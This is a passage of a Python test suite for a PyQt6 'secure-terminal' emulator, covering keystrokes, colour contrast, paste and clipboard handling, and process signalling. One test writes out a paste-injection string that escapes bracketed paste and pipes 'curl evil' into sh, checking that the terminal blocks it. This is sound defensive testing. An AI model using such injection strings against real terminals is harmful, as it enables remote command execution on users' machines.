        _bell.apply_bell_sound(_outside)
        ok(_bell._bell_sound == _outside, 'apply_bell_sound: an allowed path is stored')
        ok(_bell._play_sound() is True,
           '_play_sound: builds the sound effect and plays it -> True')
        _bell._sound_effect = None
        _FakeSoundEffect.raise_on = 'play'
        ok(_bell._play_sound() is False,
           '_play_sound: a playback error is contained -> False')
    finally:
        if _o_qm is None:
            sys.modules.pop('PyQt6.QtMultimedia', None)
        else:
            sys.modules['PyQt6.QtMultimedia'] = _o_qm
    _bell2 = SecureTerminal(command='/bin/cat')
    ok(_bell2._play_sound() is False, '_play_sound: no configured sound -> False')
finally:
    _term.BELL_SOUND_DIRS = _orig_dirs

# --- TUI keystroke encoding (_tui_key) ----------------------------------------
_tk = SecureTerminal(command='/bin/cat')
_tksent = spy_writes(_tk)


def _tuikey(qtkey, text='', mods=Qt.KeyboardModifier.NoModifier):
    _tk._tui_key(QKeyEvent(QEvent.Type.KeyPress, qtkey, mods, text))


_tuikey(Qt.Key.Key_Tab, '\t', Qt.KeyboardModifier.ShiftModifier)   # back-tab
eq(_tksent, [b'\x1b[Z'], 'TUI: Shift+Tab -> back-tab (CSI Z)')
_tksent.clear()
_tuikey(Qt.Key.Key_Up)                                             # mapped arrow
eq(_tksent, [b'\x1b[A'], 'TUI: an arrow key sends its VT sequence')
_tksent.clear()
_tuikey(Qt.Key.Key_C, '', Qt.KeyboardModifier.ControlModifier)     # Ctrl+C
eq(_tksent, [b'\x03'], 'TUI: Ctrl+letter sends the control byte')
_tksent.clear()
_tuikey(Qt.Key.Key_BracketLeft, '\x1b', Qt.KeyboardModifier.ControlModifier)
eq(_tksent, [b'\x1b'], 'TUI: a control-char keystroke is forwarded as its byte')
_tksent.clear()
_tuikey(Qt.Key.Key_A, 'a')                                         # printable
eq(_tksent, [b'a'], 'TUI: a printable key is sent as UTF-8')
_tksent.clear()
_tuikey(Qt.Key.Key_A, 'a', Qt.KeyboardModifier.AltModifier)        # Alt+printable
eq(_tksent, [b'\x1ba'], 'TUI: Alt+printable is prefixed with ESC (meta)')
_tksent.clear()
_tuikey(Qt.Key.Key_unknown, chr(0x202E))                           # bidi override
eq(_tksent, [], 'TUI: a non-printable keystroke is dropped')

# --- foreground process group / cwd helpers -----------------------------------
_fg = SecureTerminal(command='/bin/cat')
_saved_fd = _fg._fd
_fg._fd = None
ok(_fg._foreground_pgrp() is None, '_foreground_pgrp: no pty fd -> None')
ok(_fg.cwd_basename() is None or isinstance(_fg.cwd_basename(), str),
   'cwd_basename: tolerates a missing foreground')
_fg._fd = _saved_fd
# a pipe fd is not a tty -> tcgetpgrp raises -> None
_pr, _pw = os.pipe()
_fg._fd = _pr
ok(_fg._foreground_pgrp() is None,
   '_foreground_pgrp: a non-tty fd -> None (tcgetpgrp fails)')
_fg._fd = _saved_fd
os.close(_pr)
os.close(_pw)
# has_foreground_program / terminate_foreground with nothing to act on
_fg._foreground_pgrp = lambda: None
ok(not _fg.has_foreground_program(),
   'has_foreground_program: no foreground group -> False')
ok(not _fg.terminate_foreground(),
   'terminate_foreground: nothing running -> no signal sent')

# --- Ctrl+wheel zoom ----------------------------------------------------------
from PyQt6.QtGui import QWheelEvent          # noqa: E402
from PyQt6.QtCore import QPointF, QPoint      # noqa: E402
_wz = SecureTerminal(command='/bin/cat')
_zoom = []
_wz.zoom_step.connect(_zoom.append)


def _wheel(dy, mods):
    ev = QWheelEvent(QPointF(1, 1), QPointF(1, 1), QPoint(0, 0), QPoint(0, dy),
                     Qt.MouseButton.NoButton, mods,
                     Qt.ScrollPhase.NoScrollPhase, False)
    _wz.wheelEvent(ev)


_wheel(120, Qt.KeyboardModifier.ControlModifier)
_wheel(-120, Qt.KeyboardModifier.ControlModifier)
eq(_zoom, [1, -1], 'Ctrl+wheel emits a zoom step in the scroll direction')
_zoom.clear()
_wheel(120, Qt.KeyboardModifier.NoModifier)     # plain wheel -> normal scroll
eq(_zoom, [], 'a plain wheel does not zoom')

# --- pyte cell -> QTextCharFormat rendering (_pyte_format / _pyte_qcolor) ------
from PyQt6.QtGui import QFont          # noqa: E402


class _Cell:                                # a minimal duck-typed pyte cell
    def __init__(self, fg='default', bg='default', bold=False, reverse=False,
                 underscore=False, data=' '):
        self.fg = fg
        self.bg = bg
        self.bold = bold
        self.reverse = reverse
        self.underscore = underscore
        self.data = data


_rt = SecureTerminal(command='/bin/cat')
# a truecolor 6-hex fg + bg -> both applied (valid QColor path)
_f1 = _rt._pyte_format(_Cell(fg='ff0000', bg='00ff00'))
ok(_f1.foreground().color().name() == '#ff0000',
   '_pyte_format: a truecolor fg hex is applied')
ok(_f1.background().color().name() == '#00ff00',
   '_pyte_format: a background colour is applied')
# a STRUCTURAL half-block glyph (U+2580) keeps its near-equal truecolour bg: the grid
# contrast guard is skipped for it, so a half-block colour ramp is not banded.
_fs = _rt._pyte_format(_Cell(fg='c0c0c0', bg='b4b4b4', data='\u2580'))
ok(_fs.background().color().name() == '#b4b4b4',
   '_pyte_format: a structural glyph keeps its truecolour bg (guard skipped)')
ok(_fs.foreground().color().name() == '#c0c0c0',
   '_pyte_format: a structural glyph keeps its truecolour fg (guard skipped)')
# a NON-structural cell with the same near-equal fg/bg still triggers the guard.
ok(_rt._pyte_format(_Cell(fg='c0c0c0', bg='b4b4b4', data='X'))
   .foreground().color().name() != '#c0c0c0',
   '_pyte_format: the guard still fires for a non-structural near-equal fg/bg')
# an invalid hex colour falls back to the default foreground
ok(_rt._pyte_qcolor('nothex', None) is None,
   '_pyte_qcolor: an invalid hex with no default -> None')
ok(_rt._pyte_qcolor('zzzzzz', QColor('#123456').name()).isValid(),
   '_pyte_qcolor: an invalid hex falls back to the given default')
_f2 = _rt._pyte_format(_Cell(fg='ff0000', bg='0000ff', reverse=True))
ok(_f2.background().color().name() == '#ff0000',
   '_pyte_format: reverse video swaps fg into the background')
_f3 = _rt._pyte_format(_Cell(fg='cccccc', bold=True, underscore=True))
ok(_f3.fontWeight() == QFont.Weight.Bold and _f3.fontUnderline(),
   '_pyte_format: bold and underscore attributes are applied')
# fg == bg (a program hiding text) triggers the contrast guard -> readable fg
_f4 = _rt._pyte_format(_Cell(fg='202020', bg='202020'))
ok(_f4.foreground().color().name() != '#202020',
   '_pyte_format: fg == bg is overridden to a readable colour')

# --- exhaustive TUI contrast sweep: every pyte colour, both reverse states -----
# The TUI path (_pyte_format) has an extra lever the line path lacks -- reverse
# video, which swaps fg/bg -- so sweep it too: every pyte colour name (plus
# 'default') as fg against each as bg, bold on/off, reverse on/off, both themes.
# Bold promotes fg to its bright palette variant here, so bright colours are
# covered as well. Invariant: the drawn fg is never near-invisible on its bg.
from secure_terminal.terminal import _PYTE_COLOR as _PC, THEMES as _TH2  # noqa: E402
from secure_terminal.terminal import _rgb as _rgb3                      # noqa: E402
from secure_terminal.sanitize import too_close as _tc3                  # noqa: E402
_names = list(_PC.keys()) + ['default']

def _tui_pair(_fmt, _theme):
    _fgb = _fmt.foreground()
    if _fgb.style() == Qt.BrushStyle.NoBrush:
        return None
    _theme_bg = _TH2.get(_theme, _TH2['dark'])[0]
    _bgb = _fmt.background()
    _bg = _bgb.color() if _bgb.style() != Qt.BrushStyle.NoBrush else QColor(_theme_bg)
    return _rgb3(_fgb.color()), _rgb3(_bg)

_tui_checked = 0
_tui_bad = []
for _theme in ('dark', 'light'):
    _rt.apply_theme(_theme)
    _rt._fmt_cache.clear()                  # theme change invalidates cached formats
    for _fg in _names:
        for _bg in _names:
            for _bold in (False, True):
                for _rev in (False, True):
                    _pair = _tui_pair(_rt._pyte_format(
                        _Cell(fg=_fg, bg=_bg, bold=_bold, reverse=_rev)), _theme)
                    if _pair is None:
                        continue
                    _tui_checked += 1
                    if _tc3(*_pair):
                        _tui_bad.append((_theme, _fg, _bg, _bold, _rev))
ok(not _tui_bad,
   'contrast(tui): every pyte fg x bg x bold x reverse x theme stays readable '
   '(%d combos checked, unreadable: %r)' % (_tui_checked, _tui_bad[:3]))
_rt.apply_theme('dark')
_rt._fmt_cache.clear()

# the OSC 10/11 default-move attack: a program moves the DEFAULT fg and bg onto
# the same colour, then prints text in the default colours -- hoping the guard's
# fallback (which uses the default fg) collides too. The guard must fall back to a
# fixed readable colour, not the program-moved default, so the text still shows.
_rt._osc_palette['fg'] = '#303030'
_rt._osc_palette['bg'] = '#303030'
_f_osc = _rt._pyte_format(_Cell(fg='default', bg='default'))
_op = _tui_pair(_f_osc, 'dark')
ok(_op is not None and not _tc3(*_op),
   'contrast(tui): the OSC default-move attack (fg==bg via OSC 10/11) is still forced readable')
_rt._osc_palette.pop('fg', None)
_rt._osc_palette.pop('bg', None)
_rt._fmt_cache.clear()

# _pyte_bell rings unless we are seeding retained scrollback
_rt._seeding = True
_rt._pyte_bell()                            # seeding -> no ring (just returns)
_rt._seeding = False
_rt._pyte_bell()                            # -> _ring() (must not raise)
ok(True, '_pyte_bell: rings when not seeding, stays quiet while seeding')

# --- terminate_foreground actually signals a real foreground group ------------
import subprocess as _subprocess          # noqa: E402
import secure_terminal.terminal as _term2  # noqa: E402  (QTimer lives here)

# a throwaway process group that IGNORES SIGTERM, so the 2s survivor SIGKILLs it
_victim = _subprocess.Popen(['sh', '-c', 'trap "" TERM; exec sleep 30'],
                            start_new_session=True)
pump(60)
_victim_pgrp = os.getpgid(_victim.pid)
_fgk = SecureTerminal(command='/bin/cat')
_fgk._pid = None                            # so the group is never mistaken for the shell
_fgk._foreground_pgrp = lambda: _victim_pgrp
ok(_fgk.has_foreground_program(),
   'has_foreground_program: a real foreground group -> True')
ok(_fgk.terminate_foreground(),
   'terminate_foreground: SIGTERMs the foreground group')
pump(2300)                                  # let the survivor SIGKILL fire
try:
    _victim.wait(timeout=3)
except _subprocess.TimeoutExpired:
    _victim.kill()
ok(_victim.returncode is not None,
   'terminate_foreground: a TERM-ignoring group is SIGKILLed by the survivor')

# --- bell ring: channel gating + rate limit -----------------------------------
_rg = SecureTerminal(command='/bin/cat')
_rg._bell_channels = set()
_rg._ring()                                 # no channels enabled -> returns early
ok(True, '_ring: with no channels enabled it does nothing')
_rg._bell_channels = {'audible'}
_rg._last_bell = 0.0
_rg._ring()                                 # fires
_rg._ring()                                 # within 200ms -> rate-limited (returns)
ok(True, '_ring: a second ring within ~200ms is rate-limited')
eq(_rg.current_paste_delay(), _rg._paste_delay,
   'current_paste_delay: returns the configured paste delay')

# --- paste: an all-control paste sanitizes to nothing; bracketed paste in TUI --
_pt = SecureTerminal(command='/bin/cat')
_pt.apply_paste_warn('never')               # test the sanitize+bracket path directly
_pts = spy_writes(_pt)
_pmime = QMimeData()
_pmime.setText('\x00\x01\x02')              # only control bytes -> stripped to ''
_pt.insertFromMimeData(_pmime)
eq(_pts, [], 'paste: a control-only clipboard sanitizes to nothing (sends nothing)')
# bracketed paste: with DEC mode 2004 set by the program, a paste is wrapped
_pt.apply_tui(True)
feed_output(_pt, b'\x1b[?2004h')            # program enables bracketed paste
_pts.clear()
_pmime2 = QMimeData()
_pmime2.setText('echo hi')
_pt.insertFromMimeData(_pmime2)
ok(_pts and _pts[0].startswith(b'\x1b[200~') and _pts[0].endswith(b'\x1b[201~'),
   'paste: bracketed-paste mode wraps the pasted data in the DEC 2004 markers')
# gap (ai-review): a paste containing the bracketed-paste END marker must NOT break
# out of the bracketed region and inject a command -- the ESC of an embedded
# \x1b[201~ is stripped, so the only real END marker is the terminal's own trailing
# one. Without this a pasted "...\x1b[201~; evil" would run "evil" as typed input.
_pts.clear()
_o_pw_bp = _pt.current_paste_warn()
_pt.apply_paste_warn('never')                       # send directly (test wrap+sanitize)
_pmime_bp = QMimeData()
_pmime_bp.setText('ls\x1b[201~; curl evil|sh')
_pt.insertFromMimeData(_pmime_bp)
ok(_pts and _pts[0].count(b'\x1b[201~') == 1 and _pts[0].endswith(b'\x1b[201~')
   and b'\x1b[200~' not in _pts[0][6:],
   'paste: an embedded bracketed-paste END marker cannot break out (ESC stripped)')
_pt.apply_paste_warn(_o_pw_bp)

# --- review 'never' keeps content (does not strip) + emits the unreviewed-risk
# signal, so disabling review preserves function but the risk stays VISIBLE.
_nv = SecureTerminal(command='/bin/cat')
_nv.apply_paste_warn('never')
_nvsent = spy_writes(_nv)
_nvrisk = []
_nv.unreviewed_risk.connect(lambda: _nvrisk.append(1))
_nvm = QMimeData()
_nvm.setText('caf\u00e9')                            # printable non-ASCII (e-acute)
_nv.insertFromMimeData(_nvm)
ok(b'caf\xc3\xa9' in b''.join(_nvsent),
   "paste 'never' keeps printable unicode (not stripped to ASCII)")
ok(_nvrisk, "paste 'never' of risky text emits the unreviewed-risk signal")
_nvrisk.clear()
_nvsent.clear()
_nvm2 = QMimeData()
_nvm2.setText('ls -la')                              # clean ASCII: not risky
_nv.insertFromMimeData(_nvm2)
ok(not _nvrisk, "paste 'never' of clean ASCII does not emit the risk signal")
# copy 'never' of a risky (unicode) selection keeps it + emits the risk signal
_cv = SecureTerminal(command='/bin/cat')
_cv.apply_mode('show')
_cv.apply_copy_warn('never')
feed_output(_cv, 'caf\u00e9\n'.encode('utf-8'))
_cv.selectAll()
_cvrisk = []
_cv.unreviewed_risk.connect(lambda: _cvrisk.append(1))
_cv.copy()
ok(_cvrisk, "copy 'never' of risky text emits the unreviewed-risk signal")

# --- reset_caret with no output cursor snaps to the document end --------------
_rc = SecureTerminal(command='/bin/cat')
_rc._out_cursor = None
_rc.reset_caret()
ok(True, 'reset_caret: with no output cursor it snaps the caret to the end')

# --- defensive syscall guards, fault-injected ---------------------------------
import os as _os

# shutdown tolerates an already-closed fd and a dead pid (close/kill/waitpid)
_sd = SecureTerminal(command='/bin/cat')
_rp, _wp = os.pipe()
os.close(_rp)
os.close(_wp)
_sd._fd = _rp                               # already closed -> os.close raises
_sd._pid = 999999                           # no such pid -> kill/waitpid raise
_sd.shutdown()
ok(_sd._fd is None and _sd._pid is None,
   'shutdown: tolerates a closed fd and a dead pid')

# _write is a safe no-op with no fd, and drops output on a closed fd
_wt2 = SecureTerminal(command='/bin/cat')
_wt2._fd = None
_wt2._write(b'x')                           # no fd -> return
_rp2, _wp2 = os.pipe()
os.close(_rp2)
os.close(_wp2)
_wt2._fd = _wp2                             # closed fd -> os.write OSError -> dropped
_wt2._write(b'x')
ok(True, '_write: safe no-op with no fd, and drops output on a closed fd')

# cwd / foreground helpers survive an OS error reading /proc
_cw = SecureTerminal(command='/bin/cat')
_o_readlink = _os.readlink
_o_getpgid = _os.getpgid
# Force a deterministic, truthy foreground pgrp so the readlink/getpgid fault-
# injections below are ALWAYS reached: a freshly-spawned cat's tcgetpgrp can briefly
# be unset (the setsid race), which would skip these defensive except branches. The
# cat's real _pid is left intact (non-None) so has_foreground_program reaches getpgid.
_cw._foreground_pgrp = lambda: os.getpid()


def _raise_os(*_a, **_k):
    raise OSError('injected')


try:
    _os.readlink = _raise_os
    ok(_cw.cwd_basename() is None, 'cwd_basename: a /proc read error -> None')
    _os.getpgid = lambda *_a, **_k: (_ for _ in ()).throw(ProcessLookupError())
    ok(not _cw.has_foreground_program(),
       'has_foreground_program: a reaped shell (getpgid fails) -> False')
finally:
    _os.readlink = _o_readlink
    _os.getpgid = _o_getpgid

# cwd_basename: the home directory renders as '~'
_cw2 = SecureTerminal(command='/bin/cat')
_cw2._pid = 1
_cw2._foreground_pgrp = lambda: None
try:
    _os.readlink = lambda *_a, **_k: os.path.expanduser('~')
    eq(_cw2.cwd_basename(), '~', 'cwd_basename: the home directory shows as ~')
finally:
    _os.readlink = _o_readlink

# --- a few testable feature branches ------------------------------------------
# _raw scrollback is capped (drop the oldest) when it overflows
_rw = SecureTerminal(command='/bin/cat')
_rw._raw = 'x' * (_rw._RAW_MAX + 10)
_rw._echo_caret('^C')
ok(len(_rw._raw) <= _rw._RAW_MAX, '_echo_caret caps the retained raw output')

# createMimeDataFromSelection returns a mime object
_ms = SecureTerminal(command='/bin/cat')
_ms._append('hello world')
_ms.selectAll()
ok(_ms.createMimeDataFromSelection() is not None,
   'createMimeDataFromSelection returns the selection as mime data')

# a double-click NOT on a marking falls through to the base handler
_dc2 = SecureTerminal(command='/bin/cat')
_dc2._append('plain')
_dbl2 = QMouseEvent(QEvent.Type.MouseButtonDblClick, QPointF(1, 1),
                    Qt.MouseButton.LeftButton, Qt.MouseButton.LeftButton,
                    Qt.KeyboardModifier.NoModifier)
_dc2.mouseDoubleClickEvent(_dbl2)
ok(True, 'double-click off a marking uses the default handler')

# --- OSC colour + clipboard-read handling -------------------------------------
_oc = SecureTerminal(command='/bin/cat')
eq(_oc._parse_osc_color(b'rgb:ab/cd/ef'), '#abcdef', 'OSC colour rgb: form parsed')
eq(_oc._parse_osc_color(b'#123456'), '#123456', 'OSC colour #hex form parsed')
eq(_oc._parse_osc_color(b'red'), '#ff0000', 'OSC colour name parsed')
ok(_oc._parse_osc_color(b'not-a-colour') is None, 'OSC colour: garbage -> None')
_oc._osc_color(4, b'1;rgb:ff/00/00')        # a valid palette override
ok(_oc._osc_palette.get(1) == '#ff0000', 'OSC 4 sets a palette index')
_oc._osc_color(4, b'no-semicolon')          # malformed -> ignored
_oc._osc_color(4, b'x;rgb:00/00/00')        # non-digit index -> ignored
_oc._osc_color(10, b'rgb:00/ff/00')         # default fg
_oc._osc_color(11, b'rgb:00/00/ff')         # default bg
_oc._osc_color(12, b'rgb:ff/ff/00')         # cursor
_oc._osc_color(10, b'garbage')              # unparseable -> ignored
ok('fg' in _oc._osc_palette and 'bg' in _oc._osc_palette,
   'OSC 10/11/12 override the default fg/bg/cursor colours')

# OSC 52 clipboard-read gating: off, approved, denied, always, and ask-once
_oc._osc['osc_clipboard_read'] = False
_oc._osc_clipboard_read()                   # feature off -> nothing
_oc._osc['osc_clipboard_read'] = True
_oc._clipboard_read = True
_oc._osc_clipboard_read()                   # approved -> reply
_oc._clipboard_read = False
_oc._osc_clipboard_read()                   # denied -> nothing
_oc._clipboard_read = None
_oc._clipboard_read_always = True
_oc._osc_clipboard_read()                   # global always-allow -> reply
_oc._clipboard_read = None
_oc._clipboard_read_always = False
_creq = []
_oc.clipboard_read_requested.connect(lambda: _creq.append(1))
_oc._osc_clipboard_read()                   # ask once -> raise the request
ok(_creq and _oc._clipboard_read == 'pending',
   'OSC 52 read: an un-granted tab asks once and never replies')

# feed guards: no pyte stream (line mode), an empty chunk, alt-leave with no save
_lm = SecureTerminal(command='/bin/cat')    # line mode -> _stream is None
_lm._feed_stream(b'anything')
_oc._feed_bytes(b'')
_oc._alt_leave()                            # _alt_saved is None -> returns
ok(True, 'feed guards: no stream, empty chunk and alt-leave-without-save are safe')

# --- more terminal branches ----------------------------------------------------
import fcntl as _fcntl                                          # noqa: E402
from PyQt6.QtGui import QHelpEvent                              # noqa: E402
from PyQt6.QtCore import QPoint                                 # noqa: E402

# apply_zoom while in grid mode schedules a repaint
_gz = SecureTerminal(command='/bin/cat')
_gz.apply_tui(True)
feed_output(_gz, b'\x1b[?1049h')            # alt screen -> grid mode
_gz.apply_zoom(150)
ok(True, 'apply_zoom in grid mode schedules a repaint')

# _set_winsize: no-fd short-circuit and an ioctl error are both swallowed
_sw = SecureTerminal(command='/bin/cat')
_sw._set_winsize(80, 24)                     # succeeds on a real pty
_sw._set_winsize(70000, 70000)               # oversized: clamped to 0xFFFF, no struct.error (#9)
_o_ioctl = _fcntl.ioctl
try:
    _fcntl.ioctl = lambda *_a, **_k: (_ for _ in ()).throw(OSError())
    _sw._set_winsize(80, 24)                 # ioctl raises -> swallowed
finally:
    _fcntl.ioctl = _o_ioctl
_sw._fd = None
_sw._set_winsize(80, 24)                     # no fd -> return
ok(True, '_set_winsize tolerates a closed pty and an ioctl error')

# apply_markings toggles and re-renders only on a real change
_am = SecureTerminal(command='/bin/cat')
_am.apply_markings(not _am.markings_enabled())
ok(True, 'apply_markings re-renders on a change')

# _end_sync_update is a no-op when no synchronized update is open
_es = SecureTerminal(command='/bin/cat')
_es._end_sync_update()
ok(True, '_end_sync_update: nothing open -> no-op')

# _render_tui is a no-op with no pyte screen (line mode)
_rt2 = SecureTerminal(command='/bin/cat')
_rt2._render_tui()
ok(True, '_render_tui: no screen -> no-op')

# _on_readable swallows a spurious EAGAIN (non-blocking read not ready)
_or = SecureTerminal(command='/bin/cat')
_o_read = _os.read
try:
    _os.read = lambda *_a, **_k: (_ for _ in ()).throw(BlockingIOError())
    _or._on_readable()                       # EAGAIN -> return, no crash
finally:
    _os.read = _o_read
ok(True, '_on_readable: a not-ready non-blocking fd is handled')

# PageUp/PageDown scroll the scrollback (line mode)
_pg = SecureTerminal(command='/bin/cat')
key(_pg, Qt.Key.Key_PageUp)
key(_pg, Qt.Key.Key_PageDown)
ok(True, 'PageUp/PageDown drive the scrollbar')

# in TUI mode a plain key is encoded as VT input (keyPressEvent -> _tui_key)
_tk2 = SecureTerminal(command='/bin/cat')
_tk2.apply_tui(True)
_tks2 = spy_writes(_tk2)
key(_tk2, Qt.Key.Key_A, 'a')
ok(_tks2 == [b'a'], 'TUI mode: keyPressEvent routes a plain key through _tui_key')

# a MODIFIED cursor/End key is CSI-encoded so the child sees the modifier -- e.g.
# claude-code's Ctrl+End "jump to bottom" (ESC[1;5F). Bare End stays ESC[F.
_tkm = SecureTerminal(command='/bin/cat')
_tkm.apply_tui(True)
_tkms = spy_writes(_tkm)
key(_tkm, Qt.Key.Key_End, mods=Qt.KeyboardModifier.ControlModifier)
key(_tkm, Qt.Key.Key_End, mods=Qt.KeyboardModifier.ShiftModifier)
key(_tkm, Qt.Key.Key_Up, mods=Qt.KeyboardModifier.ControlModifier)
key(_tkm, Qt.Key.Key_End)
eq(_tkms, [b'\x1b[1;5F', b'\x1b[1;2F', b'\x1b[1;5A', b'\x1b[F'],
   'TUI: a modified cursor/End key is CSI-encoded (Ctrl+End=ESC[1;5F); bare End=ESC[F')

# a tooltip over empty space (no codepoint) hides any tip
_tt = SecureTerminal(command='/bin/cat')
_hv = QHelpEvent(QEvent.Type.ToolTip, QPoint(3, 3), _tt.mapToGlobal(QPoint(3, 3)))
_tt.event(_hv)
ok(True, 'a tooltip over empty space hides the tip without error')

# stop any repeating timers these grid/TUI terminals started, so they do not
# fire into the offscreen platform's static teardown (which would crash a
# process that has otherwise passed cleanly)
for _tstop in (_gz, _tk2, _rt2, _es, _am):
    for _tmr in ('_render_timer', '_sync_timer'):
        _t = getattr(_tstop, _tmr, None)
        if _t is not None:
            _t.stop()

# --- terminfo source lookup ---------------------------------------------------
from secure_terminal.terminal import _terminfo_source           # noqa: E402
ok(_terminfo_source() is None or isinstance(_terminfo_source(), str),
   '_terminfo_source resolves a path or returns None')

# createMimeDataFromSelection with no selection delegates to the base handler
_nm = SecureTerminal(command='/bin/cat')
_nm.moveCursor(QTextCursor.MoveOperation.End)
ok(_nm.createMimeDataFromSelection() is not None,
   'copy with no selection delegates to the base handler')

# terminate_foreground: refuses our own group; only-the-shell is a no-op; killpg error -> False
# refuses to signal secure-terminal's OWN process group (defensive self-kill guard).
_tfo = SecureTerminal(command='/bin/cat')
_tfo._pid = os.getpid()
_tfo._foreground_pgrp = lambda: os.getpgrp()
ok(not _tfo.terminate_foreground(),
   'terminate_foreground: refuses to signal our own process group')
_tfo.close()
# only the shell in the foreground (login shell, fg pgrp == the shell's own pgrp,
# in a session of its own so it is NOT our group) -> a no-op that signals nothing.
_tfs = _subprocess.Popen(['sleep', '30'], start_new_session=True)
pump(60)
_tf = SecureTerminal(command='/bin/cat')
_tf._command = None                         # login-shell semantics for this branch
_tf._pid = _tfs.pid
_tf._foreground_pgrp = lambda: os.getpgid(_tfs.pid)
ok(not _tf.terminate_foreground(),
   'terminate_foreground: only the shell in the foreground -> no-op')
ok(_tfs.poll() is None,
   'terminate_foreground: the shell no-op signals nothing')
_tf.close()
_tfs.terminate()
_tfs.wait()
# a killpg error (invalid pgrp) is reported as False.
_tf2 = SecureTerminal(command='/bin/cat')
_tf2._pid = None
_tf2._foreground_pgrp = lambda: 999999      # invalid pgrp -> killpg raises
ok(not _tf2.terminate_foreground(),
   'terminate_foreground: a killpg error is reported as False')
_tf2.close()

# _write retries after an EAGAIN on the non-blocking fd
_we = SecureTerminal(command='/bin/cat')
_wstate = {'n': 0}
_o_write2 = _os.write


def _flaky_write(fd, data):
    _wstate['n'] += 1
    if _wstate['n'] == 1:
        raise BlockingIOError()             # first call: kernel buffer not ready
    return _o_write2(fd, data)


try:
    _os.write = _flaky_write
    _we._write(b'hi')
finally:
    _os.write = _o_write2
ok(_wstate['n'] >= 2, '_write retries after an EAGAIN on the non-blocking fd')

# the grid-mode feed path caps the retained raw output
_bg = SecureTerminal(command='/bin/cat')
_bg.apply_tui(True)
feed_output(_bg, b'\x1b[?1049h')            # grid mode
_bg._raw = 'x' * _bg._RAW_MAX               # already at the cap
feed_output(_bg, b'y')                      # one more byte -> over cap -> trimmed
ok(len(_bg._raw) <= _bg._RAW_MAX, 'grid-mode feed caps the retained raw output')
_bg._render_timer.stop()
_bg._sync_timer.stop()

# --- OSC 52 clipboard WRITE (_osc_clipboard) ----------------------------------
import base64 as _b64                                           # noqa: E402
_ow = SecureTerminal(command='/bin/cat')
_ow._osc['osc_clipboard'] = True
_ow._osc_clipboard(b'no-semicolon')                             # malformed -> ignored
_ow._osc_clipboard(b'c;?')                                      # read/clear query -> declined
_ow._osc_clipboard(b'c;' + b'A' * 200000)                       # oversized -> declined
_ow._osc_clipboard(b'c;!!!not-base64!!!')                       # bad base64 -> ignored
_ow._osc_clipboard(b'c;' + _b64.b64encode(b'hello'))            # valid -> set clipboard
ok(True, 'OSC 52 write: malformed, query, oversized, bad-base64 and valid all handled')

# _on_readable creates the pyte screen on demand in TUI mode
_mk = SecureTerminal(command='/bin/cat')
_mk.apply_tui(True)
_mk._screen = None
feed_output(_mk, b'hi')                     # tui_active + no screen -> _make_screen
ok(_mk._screen is not None, '_on_readable builds the pyte screen on demand in TUI mode')
_mk._render_timer.stop()
_mk._sync_timer.stop()

# _place_grid_cursor is a no-op when the program hid the cursor
_pc = SecureTerminal(command='/bin/cat')
_pc.apply_tui(True)
feed_output(_pc, b'x')
if _pc._screen is not None:
    _pc._screen.cursor.hidden = True
    _pc._place_grid_cursor(_pc._screen)     # hidden -> returns without moving
ok(True, '_place_grid_cursor: a hidden cursor is left alone')
_pc._render_timer.stop()
_pc._sync_timer.stop()

# the escape-drop (line mode) path also caps the retained raw output
_ed = SecureTerminal(command='/bin/cat')
_ed._raw = 'x' * _ed._RAW_MAX
feed_output(_ed, b'\x1b]0;title\x07z')      # an OSC the line-mode path drops
ok(len(_ed._raw) <= _ed._RAW_MAX, 'the escape-drop path caps the retained raw output')

# _terminfo_source returns None when no candidate file exists
_o_isfile = _os.path.isfile
try:
    _os.path.isfile = lambda _p: False
    ok(_terminfo_source() is None,
       '_terminfo_source: no candidate on disk -> None')
finally:
    _os.path.isfile = _o_isfile

# sound_file_allowed swallows a realpath OS error
_o_realpath = _os.path.realpath
try:
    _os.path.realpath = lambda *_a, **_k: (_ for _ in ()).throw(OSError())
    ok(not _term.sound_file_allowed('/some/path.wav'),
       'sound_file_allowed: a realpath error -> rejected, not raised')
finally:
    _os.path.realpath = _o_realpath

# _write bails out once its 2s deadline passes (a child that never drains input)
_wd = SecureTerminal(command='/bin/cat')
import time as _time                                            # noqa: E402
_o_write3 = _os.write
_o_mono = _time.monotonic
_mono_calls = {'n': 0}


def _mono_jump():
    _mono_calls['n'] += 1
    return 0.0 if _mono_calls['n'] == 1 else 100.0   # base, then past the deadline


try:
    _os.write = lambda *_a, **_k: (_ for _ in ()).throw(BlockingIOError())
    _time.monotonic = _mono_jump
    _wd._write(b'z')                        # always EAGAIN + deadline passed -> bail
finally:
    _os.write = _o_write3
    _time.monotonic = _o_mono
ok(True, '_write bails out when its write deadline passes')

# --- terminfo directory: build-time entry, and tic-compiled on demand ---------
from secure_terminal.sanitize import MARK_KEY as _MK            # noqa: E402
# BOTH entries: cli_terminfo_dir only accepts a compilation that carries the
# -noedit entry too, because _child_term hands that TERM to the child on the
# strength of this probe -- a dir with just the base entry gave the shell a TERM
# with no compiled entry at all.
_TISRC = ('secure-terminal|test term,\n\tam,\n\tcols#80,\n\n'
          'secure-terminal-noedit|test term append-only,\n'
          '\tuse=secure-terminal,\n')
_o_ts = _term._terminfo_source
_o_cache = os.environ.get('XDG_CACHE_HOME')
try:
    # a compiled entry shipped next to the source is used directly
    _ti = tempfile.mkdtemp()
    with open(os.path.join(_ti, 'secure-terminal.ti'), 'w', encoding='utf-8') as _f:
        _f.write(_TISRC)
    os.makedirs(os.path.join(_ti, 's'))
    for _name in ('secure-terminal', 'secure-terminal-noedit'):
        with open(os.path.join(_ti, 's', _name), 'w', encoding='utf-8') as _f:
            _f.write('x')
    _term._terminfo_source = lambda: os.path.join(_ti, 'secure-terminal.ti')
    eq(_term.cli_terminfo_dir(), _ti,
       'cli_terminfo_dir: a build-time compiled entry is used as-is')
    # ...but a compilation carrying ONLY the base entry is NOT usable: line_edits
    # off would hand the child a TERM that does not resolve.
    os.remove(os.path.join(_ti, 's', 'secure-terminal-noedit'))
    os.environ['XDG_CACHE_HOME'] = tempfile.mkdtemp()
    ok(_term.cli_terminfo_dir() != _ti,
       'cli_terminfo_dir: a half compilation (no -noedit entry) is rejected')
    with open(os.path.join(_ti, 's', 'secure-terminal-noedit'), 'w',
              encoding='utf-8') as _f:
        _f.write('x')
    # otherwise it compiles the source into the user cache with tic
    _ti2 = tempfile.mkdtemp()
    _src2 = os.path.join(_ti2, 'secure-terminal.ti')
    with open(_src2, 'w', encoding='utf-8') as _f:
        _f.write(_TISRC)
    os.environ['XDG_CACHE_HOME'] = tempfile.mkdtemp()
    _term._terminfo_source = lambda: _src2
    ok(_term.cli_terminfo_dir() is not None,
